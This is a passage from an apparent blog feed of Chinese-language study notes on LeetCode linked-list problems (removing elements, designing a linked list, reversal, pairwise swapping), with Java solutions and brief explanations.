    <content type="html"><![CDATA[<h4 id="移除列表元素"><a href="#移除列表元素" class="headerlink" title="移除列表元素"></a>移除列表元素</h4><p>link：<a href="https://leetcode.cn/problems/remove-linked-list-elements/description/">203. 移除链表元素 - 力扣（LeetCode）</a></p><p>首先单向链表是有一个数据域和指针域且在内存中不连续.<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20241002232434525.png" alt="image-20241002232434525"><br>链表的查找需要从头往后一个个查找【时间复杂度为O(n)】，但是数组查找只需要访问对应元素下标即可【时间复杂度为O(1)】.<br><strong>查找频繁</strong>：数组是更好的选择，因为通过索引访问的时间复杂度是 O(1)，链表则需要遍历.</p><p><strong>插入&#x2F;删除频繁</strong>：链表更适合，因为它可以高效地插入和删除元素，时间复杂度为 O(1)（假设已找到插入或删除位置）。相反，数组在插入和删除时需要移动大量元素，时间复杂度为 O(n).</p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>看到题目最第一反应就是常规解法，遍历链表找到target直接进行删除操作.【目标是头节点和不是头节点两种情况】（其实还是想有更优雅的解法 不用单独处理移除头节点的情况）</p><h6 id="直接删除"><a href="#直接删除" class="headerlink" title="直接删除"></a>直接删除</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">removeElements</span><span class="params">(ListNode head, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">   <span class="keyword">if</span>(head == <span class="literal">null</span>)&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head.next;</span><br><span class="line"><span class="type">ListNode</span> <span class="variable">prev</span> <span class="operator">=</span> head;</span><br><span class="line"><span class="keyword">while</span>(cur != <span class="literal">null</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(cur.val == val)&#123;</span><br><span class="line">  prev.next = cur.next;</span><br><span class="line">  cur = cur.next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"> prev = cur;</span><br><span class="line"> cur = cur.next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(head.val == val)&#123;</span><br><span class="line">head = head.next;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">return</span> head;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="虚拟头节点"><a href="#虚拟头节点" class="headerlink" title="虚拟头节点"></a>虚拟头节点</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * public class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode next;</span></span><br><span class="line"><span class="comment"> *     ListNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val, ListNode next) &#123; this.val = val; this.next = next; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">removeElements</span><span class="params">(ListNode head, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">            <span class="comment">//只有头节点</span></span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//创建虚拟头节点 不用再删除头节点</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummyNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span>,head);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> dummyNode;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">prev</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span>(prev != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(prev.val == val) &#123;</span><br><span class="line">                cur.next = prev.next;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                cur = prev;</span><br><span class="line">            &#125;</span><br><span class="line">            prev = prev.next;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">return</span> dummyNode.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="设计链表"><a href="#设计链表" class="headerlink" title="设计链表"></a>设计链表</h4><p>link：<a href="https://leetcode.cn/problems/design-linked-list/">707. 设计链表 - 力扣（LeetCode）</a></p><p>综合练习链表五大操作的好题目！<br>1.获取链表的index下标节点数值.<br>2.在链表最前面插入节点.<br>3.在链表最后插入节点.<br>4.在链表第index个节点前插入节点.<br>5.删除链表第index个节点. </p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>先从链表需要的元素入手，head，tail，size.<br>考虑虚拟头节点.【优先考虑特殊情况】<br>个人觉得对于单链表更容易操作.(好吧其实就是一个懒蛋😂)</p><h6 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ListNode</span> &#123;</span><br><span class="line">    <span class="comment">//定义需要的结构</span></span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    ListNode next;</span><br><span class="line">    ListNode(<span class="type">int</span> val) &#123;</span><br><span class="line">    <span class="built_in">this</span>.val = val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyLinkedList</span> &#123;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    ListNode head;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyLinkedList</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="type">int</span> <span class="variable">size</span>  <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">      head = <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">        <span class="comment">//如果index不在范围返回-1</span></span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size) &#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="comment">//虚拟头节点的存在 使得返回index+1个节点&quot;=&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= index; i++) &#123;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cur.val;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//如果index等于0 新插入的节点就为头节点</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtHead</span><span class="params">(<span class="type">int</span> val)</span> &#123;</span><br><span class="line">        addAtIndex(<span class="number">0</span>,val);</span><br><span class="line">    &#125;</span><br><span class="line"> <span class="comment">//如果index等于链表长度 此时插入的新节点为尾节点</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtTail</span><span class="params">(<span class="type">int</span> val)</span> &#123;</span><br><span class="line">        addAtIndex(size,val);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtIndex</span><span class="params">(<span class="type">int</span> index, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">    <span class="comment">//如果index大于链表长度 返回null</span></span><br><span class="line">         <span class="keyword">if</span>(index &gt; size) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span>(index &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            index = <span class="number">0</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         size++;</span><br><span class="line">         <span class="type">ListNode</span> <span class="variable">prev</span> <span class="operator">=</span> head;</span><br><span class="line">         <span class="comment">//找到要插入节点的前驱</span></span><br><span class="line">         <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; index ;i++) &#123;</span><br><span class="line">            prev = prev.next;</span><br><span class="line">         &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">toAdd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(val);</span><br><span class="line">        toAdd.next = prev.next;</span><br><span class="line">        prev.next = toAdd;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deleteAtIndex</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">     <span class="comment">//同样的判断逻辑</span></span><br><span class="line">     <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     size--;</span><br><span class="line">     <span class="type">ListNode</span> <span class="variable">prev</span> <span class="operator">=</span> head;</span><br><span class="line">     <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; index; i++) &#123;</span><br><span class="line">        prev = prev.next;</span><br><span class="line">     &#125;</span><br><span class="line">     prev.next = prev.next.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="双链表"><a href="#双链表" class="headerlink" title="双链表"></a>双链表</h6><p>用双链表操作时需要注意指针操作的逻辑.<br>head.next &#x3D; tail;<br>tail.next &#x3D; head;<br><strong><code>index &lt; (size - 1) / 2</code> 判断用来决定是从头节点还是尾节点进行遍历，这样做是为了提高查找效率</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyLinkedList</span> &#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">ListNode</span> &#123;</span><br><span class="line">        <span class="type">int</span> val;</span><br><span class="line">        ListNode next,prev;</span><br><span class="line">        ListNode(<span class="type">int</span> x) &#123;val = x;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    ListNode head,tail;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyLinkedList</span><span class="params">()</span> &#123;</span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">        head = <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        tail = <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        head.next = tail;</span><br><span class="line">        tail.prev = head;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)&#123;<span class="keyword">return</span> -<span class="number">1</span>;&#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过判断 index &lt; (size - 1) / 2 来决定是从头结点还是尾节点遍历，提高效率</span></span><br><span class="line">        <span class="keyword">if</span>(index &lt; (size - <span class="number">1</span>) / <span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= index; i++)&#123;</span><br><span class="line">                cur = cur.next;</span><br><span class="line">            &#125;            </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            cur = tail;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= size - index - <span class="number">1</span>; i++)&#123;</span><br><span class="line">                cur = cur.prev;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cur.val;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtHead</span><span class="params">(<span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(val);</span><br><span class="line">        newNode.next = cur.next;</span><br><span class="line">        cur.next.prev = newNode;</span><br><span class="line">        cur.next = newNode;</span><br><span class="line">        newNode.prev = cur;</span><br><span class="line">        size++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtTail</span><span class="params">(<span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> tail;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(val);</span><br><span class="line">        newNode.next = tail;</span><br><span class="line">        newNode.prev = cur.prev;</span><br><span class="line">        cur.prev.next = newNode;</span><br><span class="line">        cur.prev = newNode;</span><br><span class="line">        size++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtIndex</span><span class="params">(<span class="type">int</span> index, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(index &gt; size)&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span>)&#123;index = <span class="number">0</span>;&#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; index; i++)&#123;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(val);</span><br><span class="line">        newNode.next = cur.next;</span><br><span class="line">        cur.next.prev = newNode;</span><br><span class="line">        newNode.prev = cur;</span><br><span class="line">        cur.next = newNode;</span><br><span class="line">        size++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deleteAtIndex</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(index &gt;= size || index &lt; <span class="number">0</span>)&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; index; i++)&#123;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        cur.next.next.prev = cur;</span><br><span class="line">        cur.next = cur.next.next;</span><br><span class="line">        size--;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;移除列表元素&quot;&gt;&lt;a href=&quot;#移除列表元素&quot; class=&quot;headerlink&quot; title=&quot;移除列表元素&quot;&gt;&lt;/a&gt;移除列表元素&lt;/h4&gt;&lt;p&gt;link：&lt;a href=&quot;https://leetcode.cn/problems/remove-link</summary>
      
    
    
    
    <category term="Algorithm" scheme="https://yubut.github.io/categories/Algorithm/"/>
    
    
    <category term="Algorithm" scheme="https://yubut.github.io/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title>yubのAlgorithm.0x5</title>
    <link href="https://yubut.github.io/2024/11/08/yub%E3%81%AEAlgorithm.0x5/"/>
    <id>https://yubut.github.io/2024/11/08/yub%E3%81%AEAlgorithm.0x5/</id>
    <published>2024-11-08T06:28:43.000Z</published>
    <updated>2024-11-09T05:53:13.545Z</updated>
    
    <content type="html"><![CDATA[<h4 id="反转链表"><a href="#反转链表" class="headerlink" title="反转链表"></a>反转链表</h4><p>link：<a href="https://leetcode.cn/problems/reverse-linked-list/">206. 反转链表 - 力扣（LeetCode）</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>与数组不同，链表没必要定义新的链表进行存储【对内存空间的浪费】<br>直接改变next指针即可.<br><strong>注意头节点指向的下一个节点为null</strong></p><h6 id="双指针法"><a href="#双指针法" class="headerlink" title="双指针法"></a>双指针法</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="comment">//双指针操作 </span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">prev</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="comment">//记录节点</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span>(cur != <span class="literal">null</span>) &#123;</span><br><span class="line">            temp = cur.next;<span class="comment">//保存下一个节点</span></span><br><span class="line">            cur.next = prev;</span><br><span class="line">            <span class="comment">//赋值之后整体向后移动</span></span><br><span class="line"><span class="comment">//注意先移动prev 不如cur已经移动后记录不到prev新的位置</span></span><br><span class="line">            prev = cur;</span><br><span class="line">            cur = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> prev;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="递归法"><a href="#递归法" class="headerlink" title="递归法"></a>递归法</h6><p>和双指针法是一样的逻辑【升华版】</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">      <span class="comment">//prev -&gt; null 初始化 head反转的第一个节点 启动反转操作</span></span><br><span class="line">        <span class="keyword">return</span> reverse(<span class="literal">null</span>, head);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> ListNode <span class="title function_">reverse</span><span class="params">(ListNode prev, ListNode cur)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(cur == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> prev;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        temp = cur.next;</span><br><span class="line">        cur.next = prev;</span><br><span class="line">        <span class="comment">//更新prev和cur的位置</span></span><br><span class="line">        <span class="keyword">return</span> reverse(cur,temp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//从后向前递归</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>&#123;</span><br><span class="line">    ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="comment">//边缘条件判断</span></span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(head.next == <span class="literal">null</span>) <span class="keyword">return</span> head;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//递归调用 翻转头节点之后的链表</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">last</span> <span class="operator">=</span> reverseList(head.next);</span><br><span class="line">        <span class="comment">//翻转头节点之后链表的指向</span></span><br><span class="line">        head.next.next = head;</span><br><span class="line">        <span class="comment">//此时的head节点为尾节点, next需要指向null</span></span><br><span class="line">        head.next = <span class="literal">null</span>;  </span><br><span class="line">        <span class="keyword">return</span> last;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="两两交换链表中的节点"><a href="#两两交换链表中的节点" class="headerlink" title="两两交换链表中的节点"></a>两两交换链表中的节点</h5><p>link：<a href="https://leetcode.cn/problems/swap-nodes-in-pairs/description/">24. 两两交换链表中的节点 - 力扣（LeetCode）</a></p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p><strong>注意在交换之前要先存储需要的值</strong></p><h6 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">swapPairs</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">null</span> || head.next == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">next</span> <span class="operator">=</span> head.next;</span><br><span class="line">        <span class="comment">//进行递归</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">newNode</span> <span class="operator">=</span> swapPairs(next.next);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//交换</span></span><br><span class="line">        next.next = head;</span><br><span class="line">        head.next = newNode;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="虚拟头节点"><a href="#虚拟头节点" class="headerlink" title="虚拟头节点"></a>虚拟头节点</h6><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/df4a92582bd1bc37e60fd7f3bd7916a4.png" alt="img"></p><p>我们想实现的是1和2交换，3和 